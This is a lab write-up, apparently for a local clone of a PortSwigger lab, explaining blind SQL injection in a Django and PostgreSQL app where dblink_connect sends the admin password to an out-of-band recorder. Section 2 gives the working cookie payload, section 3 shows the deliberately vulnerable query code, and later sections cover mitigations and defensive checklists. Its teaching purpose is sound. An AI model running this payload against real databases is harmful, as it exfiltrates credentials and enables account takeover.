# Lab 17 — Blind SQL injection with out-of-band data exfiltration

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration> |
| Lab id | `psw-sqli-17-out-of-band-data-exfiltration` |
| Vulnerability class | Blind SQL Injection — out-of-band (OAST) data exfiltration via `dblink_connect()` |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | PostgreSQL 16 with the `dblink` extension enabled |
| Architecture | Three Docker services on a private bridge network: `web` (Django), `db` (Postgres + dblink), `oob` (Collaborator stand-in with libpq startup-message parser) |
| Host URL | <http://127.0.0.1:18017/> |
| Flag | `FLAG{psw-sqli-17-out-of-band-exfiltration-admin-access}` |

### Objective

The home page silently executes a raw SQL lookup on the `TrackingId` cookie against the `tracked_users` table. The query result is discarded, every database exception is swallowed, and there is no timing signal — the response body is identical whether the payload fires or not. The administrator password is a random `secrets.token_urlsafe(12)` token, so character-by-character inference is impractical. The intended solve forces the database itself to open a TCP connection to the in-network `oob` recorder with the administrator password wedged into a libpq connection-string parameter, then reads the parsed parameter out of the recorder's JSON log, logs in, and visits `/my-account` for the flag.

---

## 2. Exploit walkthrough

The database has `dblink` available ([db-init/10-enable-dblink.sql:6](db-init/10-enable-dblink.sql#L6)) and runs as a superuser, so `dblink_connect()` is callable from the application role. Calling it with a crafted connection string makes Postgres resolve the host and perform a fresh libpq handshake — an outbound TCP connection that the `oob` service is waiting for on port 5432.

**Step 1 — confirm the injection point**

The `TrackingId` cookie is concatenated into the query with no quoting or binding ([shop/views.py:71-81](shop/views.py#L71-L81)). The rendered `home.html` surfaces the `oob` log live, so any outbound connection from the database shows up immediately on the page.

**Step 2 — single-shot exfiltration payload**

Set the cookie to:

```
TrackingId=x'||(SELECT dblink_connect('host=oob port=5432 sslmode=disable user='||(SELECT password FROM users WHERE username='administrator')||' password=x dbname=x'))||'
```

The server composes:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'x'||(SELECT dblink_connect('host=oob port=5432 sslmode=disable user='||(SELECT password FROM users WHERE username='administrator')||' password=x dbname=x'))||''
```

Evaluation order:

1. The inner `SELECT password FROM users WHERE username='administrator'` returns the random admin token.
2. Postgres builds the outer libpq connection string: `host=oob port=5432 sslmode=disable user=<ADMIN_PASSWORD> password=x dbname=x`.
3. `dblink_connect()` invokes libpq against `oob:5432`. libpq first sends an `SSLRequest` (8 bytes, magic `80877103`); the recorder replies `N` to coax a plaintext StartupMessage ([oob/oob.py:116-123](oob/oob.py#L116-L123)).
4. libpq then sends the v3.0 StartupMessage containing every parameter as null-terminated key/value pairs — including `user=<ADMIN_PASSWORD>`.
5. The recorder parses those pairs ([oob/oob.py:42-71](oob/oob.py#L42-L71)) and exposes them as the `pg_params` field of the log entry. The `dblink_connect` itself then errors server-side (wrong password, no such database), but the error is swallowed by the `except Exception: pass` on [shop/views.py:80-81](shop/views.py#L80-L81).

The `secrets.token_urlsafe` alphabet (`[A-Za-z0-9_-]`) is specifically chosen so the password contains no characters (spaces, quotes, `=`) that would confuse libpq's connection-string parser ([shop/management/commands/seed.py:11-14](shop/management/commands/seed.py#L11-L14)).

**Step 3 — read the password from the recorder**

The home view polls `http://oob:8080/log` on every render ([shop/views.py:56-62](shop/views.py#L56-L62)) and feeds the entries into the template. The captured entry contains:

```json
{
  "peer": "<db_ip>:<port>",
  "pg_params": {
    "user": "<ADMIN_PASSWORD>",
    "database": "x",
    "application_name": "dblink",
    ...
  }
}
```

**Step 4 — log in and collect the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18017
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<ADMIN_PASSWORD>
```

The login endpoint uses the ORM and is parameterised ([shop/views.py:118](shop/views.py#L118)). With valid credentials the session is set, `/my-account` branches on `is_admin` and renders the flag ([shop/views.py:135-150](shop/views.py#L135-L150)).

---

## 3. Vulnerable code

### 3.1 Cookie concatenated into raw SQL

[shop/views.py:65-81](shop/views.py#L65-L81)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass
```

Three compounding defects:

1. The `TrackingId` value is interpolated into the query body with `+`, not bound via a placeholder.
2. The result set is immediately discarded — this removes any in-band signal and pushes an attacker toward an out-of-band vector.
3. The bare `except Exception: pass` hides the server-side `dblink_connect` error that would normally reveal the call. Silent failure plus discarded results is the worst possible observability posture.

### 3.2 Postgres wire-protocol recorder

[oob/oob.py:107-131](oob/oob.py#L107-L131) — the TCP handler reads the first eight bytes, detects the libpq `SSLRequest`, negatiates it away with a literal `'N'`, then reads the cleartext StartupMessage that follows.

[oob/oob.py:42-71](oob/oob.py#L42-L71) — `_parse_pg_startup` walks the null-terminated key/value pairs out of the StartupMessage body and returns them as a plain dict. Any attacker-controlled value (`user`, `database`, `application_name`, etc.) comes out verbatim here.

[oob/oob.py:74-90](oob/oob.py#L74-L90) — the parsed dict is stored in the `pg_params` field of the log entry, which [shop/views.py:56-62](shop/views.py#L56-L62) polls and the template renders in-browser. This is the channel that turns the OOB interaction into a readable signal.

### 3.3 Database initialisation

[db-init/10-enable-dblink.sql:6](db-init/10-enable-dblink.sql#L6)

```sql
CREATE EXTENSION IF NOT EXISTS dblink;
```

`dblink` ships with Postgres contrib and is the canonical OOB primitive here. The extension is installed with superuser rights on first boot of the Postgres image, and the application role (`labuser`) inherits access to its functions because no explicit `REVOKE` follows. The docker-compose `db` service exposes no host ports and lives on a private bridge network ([docker-compose.yml:4-25](docker-compose.yml#L4-L25)), so an outbound OOB channel is the only way out.

### 3.4 Seed data

[shop/management/commands/seed.py:48](shop/management/commands/seed.py#L48) — `admin_password = secrets.token_urlsafe(ADMIN_PASSWORD_BYTES)` produces a URL-safe token whose alphabet is libpq-parser-safe. This is what makes one-shot exfiltration in a single connection string possible.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **Unparameterised cookie interpolated into SQL** ([shop/views.py:72-75](shop/views.py#L72-L75)) | Attacker-supplied quotes and `||` concatenation rewrite the statement. |
| **Result set discarded, exceptions swallowed** ([shop/views.py:79-81](shop/views.py#L79-L81)) | No in-band signal — forces the attacker (and hides the attack) toward OOB. |
| **`dblink` extension available to the app role** ([db-init/10-enable-dblink.sql:6](db-init/10-enable-dblink.sql#L6)) | Gives arbitrary SQL the power to open outbound libpq TCP connections. |
| **Unrestricted egress from the `db` container** ([docker-compose.yml:24-25](docker-compose.yml#L24-L25)) | Database can reach any peer on the Docker network (and would reach the internet if the bridge had a default route). |
| **Password in an alphabet compatible with libpq parameter parsing** ([shop/management/commands/seed.py:11-14](shop/management/commands/seed.py#L11-L14)) | Entire secret fits in one connection parameter — a single OOB ping exfiltrates it. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the tracking lookup

The only fix that actually closes the injection is to stop building the query by concatenation.

```python
# shop/views.py — fixed
if tracking_id is not None:
    with connection.cursor() as cursor:
        cursor.execute(
            "SELECT tracking_id FROM tracked_users WHERE tracking_id = %s",
            [tracking_id],
        )
        cursor.fetchall()
```

Even better, use the ORM:

```python
TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

### 5.2 Reject obviously-invalid tracking ids early

The seeded id is `psw-lab-visitor-001` — a bounded alphabet. Validate against a regex before touching the database:

```python
import re
_TRACKING_RE = re.compile(r"^[A-Za-z0-9._-]{1,64}$")
if tracking_id and not _TRACKING_RE.match(tracking_id):
    tracking_id = None
```

### 5.3 Do not swallow database errors blindly

Silent `except Exception: pass` both hides the exploit and hides genuine operational failures. Log at minimum:

```python
import logging
log = logging.getLogger(__name__)
...
except Exception:
    log.exception("tracked_users lookup failed")
```

Send that log to a SIEM with an alert on `dblink_connect`, `COPY PROGRAM`, `lo_import`, etc.

### 5.4 Do not ship live OOB feedback

The template block that iterates `oob_entries` is a lab affordance. In production, the application should never render attacker-observable indicators of out-of-band interactions back to the client.

---

## 6. Network / infrastructure-level mitigation

This class of bug is substantially mitigated at the database and network layers — application-layer fixes alone are not enough when the attacker reaches a DB primitive like `dblink`.

### 6.1 Remove the `dblink` extension entirely

Unless the business genuinely needs cross-database queries, the extension should not be installed at all. Delete [db-init/10-enable-dblink.sql](db-init/10-enable-dblink.sql) and, on existing clusters:

```sql
DROP EXTENSION IF EXISTS dblink;
```

Other Postgres extensions with outbound-connection capability to audit and remove by default: `postgres_fdw`, `file_fdw`, `plpython3u`, `plperlu`, `pg_net`.

### 6.2 Revoke superuser from the application role

The app should connect as a role with only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on the tables it needs, and **no** `EXECUTE` on `dblink_connect`, `dblink_exec`, `lo_import`, `lo_export`, `pg_read_server_files`, `COPY FROM PROGRAM`, or any untrusted procedural language.

```sql
REVOKE ALL ON FUNCTION dblink_connect(text) FROM PUBLIC, labuser;
REVOKE ALL ON FUNCTION dblink_connect(text, text) FROM PUBLIC, labuser;
ALTER ROLE labuser NOSUPERUSER NOCREATEDB NOCREATEROLE;
```

### 6.3 Egress denylist on the DB container

The `db` container has no legitimate reason to initiate outbound connections.

- Put `db` on an `internal: true` Docker network so it has no default gateway.
- Or attach an iptables/nftables DROP rule on the OUTPUT chain of the DB host for anything that is not the backup target.
- Or run the Postgres process under a seccomp/AppArmor profile that denies `connect(2)` on non-loopback sockets.

Any of these turns `dblink_connect('host=attacker.tld ...')` into a hard error instead of an exfiltration channel.

### 6.4 DNS egress control

Even if raw TCP is blocked, DNS is often not. Postgres will resolve the target hostname before the connection attempt, which is itself an OOB channel (the classic `xp_dirtree` / `LOAD_FILE('\\\\attacker\\...)` pattern in other engines). Restrict the DB's resolver to an internal DNS server that only answers for allow-listed zones, and log every query.

### 6.5 Web/infrastructure hardening

- `web` already binds only to `127.0.0.1:18017` ([docker-compose.yml:52](docker-compose.yml#L52)) — keep that pattern in staging.
- Put a WAF or reverse proxy in front of `web` to strip `TrackingId` cookies that do not match the expected format.
- Alert on outbound connection attempts from any database container as a high-severity event.

---

## 7. Defense-in-depth checklist

- [ ] No concatenated SQL anywhere — parameterised statements or ORM only.
- [ ] Input validation on every attacker-controlled source (cookies included, not just query strings and form bodies).
- [ ] Database role for the application has no superuser and no access to OOB-capable functions.
- [ ] `dblink`, `postgres_fdw`, and other outbound-capable extensions removed unless required.
- [ ] Database container has no outbound network path (no default route, or strict egress deny).
- [ ] DNS resolution from the DB tier is logged and restricted.
- [ ] Exceptions from database calls are logged (never silently swallowed) and alerted on.
- [ ] Monitoring rule for repeated `dblink_connect`/`COPY PROGRAM`/`pg_read_server_files` attempts.
- [ ] Secrets (admin passwords) are not stored as plaintext — store a `scrypt`/`argon2id` hash and verify in code.
- [ ] No lab-only diagnostic surfaces (OOB log reflection, executed-SQL echo) reachable in production builds.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
- PortSwigger — [Out-of-band application security testing (OAST) with Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
- PostgreSQL docs — [`dblink`](https://www.postgresql.org/docs/current/dblink.html) and [Frontend/Backend Protocol — StartupMessage](https://www.postgresql.org/docs/current/protocol-message-formats.html)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
